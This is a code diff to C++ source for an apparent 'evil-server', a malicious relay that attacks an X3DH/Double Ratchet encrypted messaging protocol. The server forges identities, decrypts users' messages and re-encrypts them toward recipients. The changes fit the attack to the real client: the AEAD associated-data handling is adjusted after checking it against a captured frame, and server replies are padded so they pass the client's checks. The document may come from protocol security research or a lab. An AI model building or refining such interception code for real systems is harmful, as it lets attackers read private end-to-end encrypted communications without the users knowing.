@@ -137,13 +137,15 @@ static Value headerJson(const std::string& dhB64, long pn, long n, const Value* 
     return h;
 }
 
-// AEAD associated data = AD || serialize(header). See the ASSUMPTION note
-// at the top of this file.
+// AEAD associated data = the X3DH session AD (my_ik_dh || their_ik_dh),
+// NOT concatenated with serialize(header). Confirmed empirically against
+// a real captured frame: the real client's AEAD associated data is just
+// the session AD on its own -- the header is authenticated implicitly
+// (its dh/pn/n drive key derivation) but its JSON bytes are never folded
+// into the AEAD 'ad' argument.
 static Bytes headerAD(const Bytes& sessionAD, const Value& header) {
-    std::string s = json::dump(header);
-    Bytes out = sessionAD;
-    out.insert(out.end(), s.begin(), s.end());
-    return out;
+    (void)header;
+    return sessionAD;
 }
 
 static RatchetState ratchetInitSender(const Bytes& sk, const Bytes& theirSpk, const Bytes& ad) {
@@ -308,6 +310,8 @@ static RatchetState x3dhRespond(const FakeIdentity& myId, const Value& init) {
         if (found) {
             Bytes dh4 = crypto::x25519(myOpk.priv, initEk);
             ikm.insert(ikm.end(), dh4.begin(), dh4.end());
+        } else {
+            fprintf(stderr, "[evil-server] WARNING opk_id=%ld requested but not found in our forged identity's OPKs!\n", opkId);
         }
     }
 
@@ -342,6 +346,7 @@ public:
         fprintf(stderr, "[evil-server] %s registered\n", user.c_str());
         Value r = Value::mkObj();
         r.set("type", Value::mkStr("ok"));
+        r.set("ok", Value::mkBool(true));
         return r;
     }
 
@@ -371,6 +376,7 @@ public:
                 user.c_str(), rb.opks.size());
         Value r = Value::mkObj();
         r.set("type", Value::mkStr("ok"));
+        r.set("ok", Value::mkBool(true));
         r.set("count", Value::mkNum((double)rb.opks.size()));
         return r;
     }
@@ -422,7 +428,7 @@ public:
             if (!initBlock) {
                 fprintf(stderr, "[evil-server] %s -> %s: no session and no init block, cannot decrypt; dropping\n",
                         from.c_str(), to.c_str());
-                Value r = Value::mkObj(); r.set("type", Value::mkStr("ok")); return r;
+                Value r = Value::mkObj(); r.set("type", Value::mkStr("ok")); r.set("ok", Value::mkBool(true)); return r;
             }
             FakeIdentity& myFakeSelf = fakeIdentityFor(to); // identity we handed out as "to"
             RatchetState st = x3dhRespond(myFakeSelf, *initBlock);
@@ -441,7 +447,7 @@ public:
             // deadlock here on every single AEAD failure. Just use the
             // outer lock.
             mailbox[to].push_back(frame);
-            Value r = Value::mkObj(); r.set("type", Value::mkStr("ok")); return r;
+            Value r = Value::mkObj(); r.set("type", Value::mkStr("ok")); r.set("ok", Value::mkBool(true)); return r;
         }
 
         std::string plaintextStr(plaintext.begin(), plaintext.end());
@@ -457,7 +463,7 @@ public:
             if (rbIt == realBundles.end() || !rbIt->second.present) {
                 fprintf(stderr, "[evil-server] %s has not published a bundle yet -- cannot forge a session "
                                 "toward them; dropping message (plaintext was still recovered above)\n", to.c_str());
-                Value r = Value::mkObj(); r.set("type", Value::mkStr("ok")); return r;
+                Value r = Value::mkObj(); r.set("type", Value::mkStr("ok")); r.set("ok", Value::mkBool(true)); return r;
             }
             FakeIdentity& myFakeAsFrom = fakeIdentityFor(from); // identity we present as "from"
             auto res = x3dhInitiate(myFakeAsFrom, rbIt->second);
@@ -478,6 +484,7 @@ public:
 
         Value r = Value::mkObj();
         r.set("type", Value::mkStr("ok"));
+        r.set("ok", Value::mkBool(true));
         return r;
     }
 
